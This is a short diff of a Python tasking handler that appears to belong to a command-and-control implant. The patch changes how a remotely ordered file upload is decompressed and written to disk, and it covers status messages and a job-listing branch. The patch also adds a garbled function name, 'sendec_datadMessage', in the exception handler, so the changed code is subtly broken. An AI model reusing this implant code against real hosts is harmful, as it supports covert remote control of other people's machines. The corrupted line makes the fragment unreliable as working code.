@@ -292,12 +292,12 @@ def processPacket(taskingID, data):
                 sendMessage(encodePacket(0, "[!] WARNING: File upload failed crc32 check during decompressing!."))
                 sendMessage(encodePacket(0, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check'])))
             f = open(filePath, 'ab')
-            f.write(raw)
+            f.write(dec_data['data'])
             f.close()
 
             sendMessage(encodePacket(42, "[*] Upload of %s successful" %(filePath) ))
         except Exception as e:
-            sendMessage(encodePacket(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)) ))
+            sendec_datadMessage(encodePacket(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)) ))
 
     elif taskingID == 50:
         # return the currently running jobs
